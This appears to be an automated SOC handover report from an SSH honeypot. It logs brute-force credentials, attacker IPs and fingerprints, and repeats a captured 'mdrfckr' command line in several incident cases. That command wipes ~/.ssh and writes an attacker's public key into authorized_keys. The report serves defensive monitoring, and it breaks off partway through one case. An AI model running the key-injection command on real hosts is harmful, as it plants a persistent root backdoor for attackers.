# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-14 |
| **Generated At** | 2026-04-14T17:15:49Z |
| **Shift Time** | 17:15 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **207** |
| Confirmed Threats | **205** |
| False Positives Filtered | **2** (1.0%) |
| Unique Attacker IPs | **11** |
| Countries of Origin | **4** |
| High Severity Cases | **76** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **131** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **183** |
| Unique Credential Pairs | **59** |
| Unique Usernames | **29** |
| Unique Passwords | **58** |
| Successful Auth Pairs | **43** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `345gs5662d34` | 38 |
| `ubuntu` | 9 |
| `tester` | 4 |
| `user` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 38 |
| `3245gs5662d34` | 38 |
| `123456` | 4 |
| `1234` | 3 |
| `qazwsxedc` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 38 |
| `root` | `3245gs5662d34` | 38 |
| `a` | `1234` | 3 |
| `tester` | `qazwsxedc` | 3 |
| `app` | `1` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12345Qwert` | `49.64.169.153` | 2026-04-14T15:45:26 |
| `root` | `3245gs5662d34` | `49.64.169.153` | 2026-04-14T15:45:30 |
| `root` | `Root13` | `49.64.169.153` | 2026-04-14T15:46:01 |
| `root` | `root6666.` | `185.16.214.226` | 2026-04-14T15:46:28 |
| `root` | `3245gs5662d34` | `185.16.214.226` | 2026-04-14T15:46:32 |
| `root` | `Qazwsx1` | `185.16.214.226` | 2026-04-14T15:46:59 |
| `root` | `ZAQ!2wsx2024.` | `49.64.169.153` | 2026-04-14T15:47:22 |
| `root` | `Hello@1234` | `185.16.214.226` | 2026-04-14T15:47:31 |
| `root` | `AA123456.` | `49.64.169.153` | 2026-04-14T15:47:55 |
| `root` | `!Q@W3e4r` | `49.64.169.153` | 2026-04-14T15:48:26 |
| `root` | `changeme` | `49.64.169.153` | 2026-04-14T15:48:43 |
| `root` | `ASDzxc123456` | `49.64.169.153` | 2026-04-14T15:49:13 |
| `root` | `qazwsx123321@#` | `49.64.169.153` | 2026-04-14T15:49:32 |
| `root` | `password01` | `49.64.169.153` | 2026-04-14T15:49:48 |
| `root` | `passroot` | `185.16.214.226` | 2026-04-14T15:50:04 |
| `root` | `a123456i` | `49.64.169.153` | 2026-04-14T15:50:21 |
| `root` | `root5` | `185.16.214.226` | 2026-04-14T15:50:38 |
| `root` | `Abcd1..` | `49.64.169.153` | 2026-04-14T15:50:39 |
| `root` | `root5` | `172.191.157.64` | 2026-04-14T15:50:40 |
| `root` | `3245gs5662d34` | `172.191.157.64` | 2026-04-14T15:50:45 |
| `root` | `1234abcdABCD` | `185.16.214.226` | 2026-04-14T15:51:13 |
| `root` | `12Qwertyuiop` | `49.64.169.153` | 2026-04-14T15:51:14 |
| `root` | `test123456!` | `49.64.169.153` | 2026-04-14T15:51:36 |
| `root` | `Root123456$` | `172.191.157.64` | 2026-04-14T15:52:26 |
| `root` | `root5` | `103.218.242.31` | 2026-04-14T15:53:35 |
| `root` | `3245gs5662d34` | `103.218.242.31` | 2026-04-14T15:53:38 |
| `root` | `Root123456$` | `185.16.214.226` | 2026-04-14T15:53:48 |
| `root` | `aaaa123456` | `185.16.214.226` | 2026-04-14T15:55:17 |
| `root` | `root6666.` | `172.191.157.64` | 2026-04-14T15:57:31 |
| `root` | `1234abcdABCD` | `103.218.242.31` | 2026-04-14T16:01:25 |
| `root` | `passroot` | `103.218.242.31` | 2026-04-14T16:03:03 |
| `root` | `1234abcdABCD` | `172.191.157.64` | 2026-04-14T16:04:13 |
| `root` | `asd123asd` | `124.70.68.216` | 2026-04-14T16:04:40 |
| `root` | `3245gs5662d34` | `124.70.68.216` | 2026-04-14T16:04:44 |
| `root` | `Hello@1234` | `172.191.157.64` | 2026-04-14T16:07:39 |
| `root` | `passroot` | `172.191.157.64` | 2026-04-14T16:09:23 |
| `root` | `Hello@1234` | `103.218.242.31` | 2026-04-14T16:12:32 |
| `root` | `Qazwsx1` | `103.218.242.31` | 2026-04-14T16:14:03 |
| `root` | `aaaa123456` | `103.218.242.31` | 2026-04-14T16:15:38 |
| `root` | `root6666.` | `103.218.242.31` | 2026-04-14T16:18:58 |
| `root` | `Qazwsx1` | `172.191.157.64` | 2026-04-14T16:19:29 |
| `root` | `aaaa123456` | `172.191.157.64` | 2026-04-14T16:22:56 |
| `root` | `Root123456$` | `103.218.242.31` | 2026-04-14T16:23:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **207** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 205 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 204 | 8 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 204 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 38 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.16.214.226`, `172.191.157.64`, `103.218.242.31`, `49.64.169.153`, `124.70.68.216`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **11** |
| Unique ASNs | **8** |
| High-Risk ASNs | **6** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS55990` | Huawei Cloud Service data center | 1 | MEDIUM |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS61400` | Start2 LLC | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (76)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-78517b7379a9

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:45 |
| **Last Seen** | 2026-04-14 15:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:45:25` | `cowrie.session.connect` |
| `2026-04-14 15:45:25` | `cowrie.client.version` |
| `2026-04-14 15:45:25` | `cowrie.client.kex` |
| `2026-04-14 15:45:26` | `cowrie.login.success` |
| `2026-04-14 15:45:26` | `cowrie.session.params` |
| `2026-04-14 15:45:26` | `cowrie.command.input` |
| `2026-04-14 15:45:26` | `cowrie.command.failed` |
| `2026-04-14 15:45:26` | `cowrie.log.closed` |
| `2026-04-14 15:45:27` | `cowrie.session.params` |
| `2026-04-14 15:45:27` | `cowrie.command.input` |
| `2026-04-14 15:45:27` | `cowrie.session.file_download` |
| `2026-04-14 15:45:27` | `cowrie.log.closed` |
| `2026-04-14 15:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8131e635984e

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:45 |
| **Last Seen** | 2026-04-14 15:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:45:29` | `cowrie.session.connect` |
| `2026-04-14 15:45:29` | `cowrie.client.version` |
| `2026-04-14 15:45:29` | `cowrie.client.kex` |
| `2026-04-14 15:45:30` | `cowrie.login.success` |
| `2026-04-14 15:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cf2c3f47a4f

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:46 |
| **Last Seen** | 2026-04-14 15:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:46:00` | `cowrie.session.connect` |
| `2026-04-14 15:46:00` | `cowrie.client.version` |
| `2026-04-14 15:46:01` | `cowrie.client.kex` |
| `2026-04-14 15:46:01` | `cowrie.login.success` |
| `2026-04-14 15:46:02` | `cowrie.session.params` |
| `2026-04-14 15:46:02` | `cowrie.command.input` |
| `2026-04-14 15:46:02` | `cowrie.command.failed` |
| `2026-04-14 15:46:02` | `cowrie.log.closed` |
| `2026-04-14 15:46:02` | `cowrie.session.params` |
| `2026-04-14 15:46:02` | `cowrie.command.input` |
| `2026-04-14 15:46:02` | `cowrie.session.file_download` |
| `2026-04-14 15:46:02` | `cowrie.log.closed` |
| `2026-04-14 15:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa2d2c06994d

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:46 |
| **Last Seen** | 2026-04-14 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:46:04` | `cowrie.session.connect` |
| `2026-04-14 15:46:04` | `cowrie.client.version` |
| `2026-04-14 15:46:04` | `cowrie.client.kex` |
| `2026-04-14 15:46:05` | `cowrie.login.success` |
| `2026-04-14 15:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb1b82572868

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:46 |
| **Last Seen** | 2026-04-14 15:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:46:27` | `cowrie.session.connect` |
| `2026-04-14 15:46:27` | `cowrie.client.version` |
| `2026-04-14 15:46:27` | `cowrie.client.kex` |
| `2026-04-14 15:46:28` | `cowrie.login.success` |
| `2026-04-14 15:46:28` | `cowrie.session.params` |
| `2026-04-14 15:46:28` | `cowrie.command.input` |
| `2026-04-14 15:46:28` | `cowrie.command.failed` |
| `2026-04-14 15:46:28` | `cowrie.log.closed` |
| `2026-04-14 15:46:28` | `cowrie.session.params` |
| `2026-04-14 15:46:28` | `cowrie.command.input` |
| `2026-04-14 15:46:29` | `cowrie.session.file_download` |
| `2026-04-14 15:46:29` | `cowrie.log.closed` |
| `2026-04-14 15:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fdbdbfd353d

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:46 |
| **Last Seen** | 2026-04-14 15:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:46:31` | `cowrie.session.connect` |
| `2026-04-14 15:46:31` | `cowrie.client.version` |
| `2026-04-14 15:46:31` | `cowrie.client.kex` |
| `2026-04-14 15:46:32` | `cowrie.login.success` |
| `2026-04-14 15:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3546827520d

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:46 |
| **Last Seen** | 2026-04-14 15:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:46:58` | `cowrie.session.connect` |
| `2026-04-14 15:46:58` | `cowrie.client.version` |
| `2026-04-14 15:46:58` | `cowrie.client.kex` |
| `2026-04-14 15:46:59` | `cowrie.login.success` |
| `2026-04-14 15:47:00` | `cowrie.session.params` |
| `2026-04-14 15:47:00` | `cowrie.command.input` |
| `2026-04-14 15:47:00` | `cowrie.command.failed` |
| `2026-04-14 15:47:00` | `cowrie.log.closed` |
| `2026-04-14 15:47:00` | `cowrie.session.params` |
| `2026-04-14 15:47:00` | `cowrie.command.input` |
| `2026-04-14 15:47:00` | `cowrie.session.file_download` |
| `2026-04-14 15:47:00` | `cowrie.log.closed` |
| `2026-04-14 15:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0feb27487505

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:47 |
| **Last Seen** | 2026-04-14 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:47:03` | `cowrie.session.connect` |
| `2026-04-14 15:47:03` | `cowrie.client.version` |
| `2026-04-14 15:47:03` | `cowrie.client.kex` |
| `2026-04-14 15:47:03` | `cowrie.login.success` |
| `2026-04-14 15:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c113ccd413

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:47 |
| **Last Seen** | 2026-04-14 15:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:47:21` | `cowrie.session.connect` |
| `2026-04-14 15:47:21` | `cowrie.client.version` |
| `2026-04-14 15:47:21` | `cowrie.client.kex` |
| `2026-04-14 15:47:22` | `cowrie.login.success` |
| `2026-04-14 15:47:22` | `cowrie.session.params` |
| `2026-04-14 15:47:22` | `cowrie.command.input` |
| `2026-04-14 15:47:22` | `cowrie.command.failed` |
| `2026-04-14 15:47:22` | `cowrie.log.closed` |
| `2026-04-14 15:47:23` | `cowrie.session.params` |
| `2026-04-14 15:47:23` | `cowrie.command.input` |
| `2026-04-14 15:47:23` | `cowrie.session.file_download` |
| `2026-04-14 15:47:23` | `cowrie.log.closed` |
| `2026-04-14 15:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f18ff4e9d44

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:47 |
| **Last Seen** | 2026-04-14 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:47:25` | `cowrie.session.connect` |
| `2026-04-14 15:47:25` | `cowrie.client.version` |
| `2026-04-14 15:47:25` | `cowrie.client.kex` |
| `2026-04-14 15:47:26` | `cowrie.login.success` |
| `2026-04-14 15:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c59e7754721

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:47 |
| **Last Seen** | 2026-04-14 15:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:47:31` | `cowrie.session.connect` |
| `2026-04-14 15:47:31` | `cowrie.client.version` |
| `2026-04-14 15:47:31` | `cowrie.client.kex` |
| `2026-04-14 15:47:31` | `cowrie.login.success` |
| `2026-04-14 15:47:32` | `cowrie.session.params` |
| `2026-04-14 15:47:32` | `cowrie.command.input` |
| `2026-04-14 15:47:32` | `cowrie.command.failed` |
| `2026-04-14 15:47:32` | `cowrie.log.closed` |
| `2026-04-14 15:47:32` | `cowrie.session.params` |
| `2026-04-14 15:47:32` | `cowrie.command.input` |
| `2026-04-14 15:47:33` | `cowrie.session.file_download` |
| `2026-04-14 15:47:33` | `cowrie.log.closed` |
| `2026-04-14 15:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8342917e29b9

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:47 |
| **Last Seen** | 2026-04-14 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:47:35` | `cowrie.session.connect` |
| `2026-04-14 15:47:35` | `cowrie.client.version` |
| `2026-04-14 15:47:35` | `cowrie.client.kex` |
| `2026-04-14 15:47:36` | `cowrie.login.success` |
| `2026-04-14 15:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e9ac600fcf

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:47 |
| **Last Seen** | 2026-04-14 15:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
